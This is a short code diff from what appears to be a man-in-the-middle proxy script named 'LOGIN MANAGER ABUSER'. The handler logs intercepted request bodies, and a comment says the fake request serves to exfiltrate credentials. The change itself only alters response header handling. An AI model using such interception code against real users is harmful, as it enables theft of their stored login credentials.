@@ -22,9 +22,12 @@ function onRequest(req, res) {
         log( "[LOGIN MANAGER ABUSER]\n", req.ReadBody() );
         // this was just a fake request we needed to exfiltrate
         // credentials to us, drop the connection with an empty 200.
+        for (var i = 0; i < res.Headers.length; i++) {
+            res.RemoveHeader(res.Headers[i].Name);
+        }
+        res.SetHeader("Connection", "close");
         res.Status      = 200;
         res.ContentType = "text/html";
-        res.Headers     = "Connection: close";
         res.Body        = "";
     }
 }
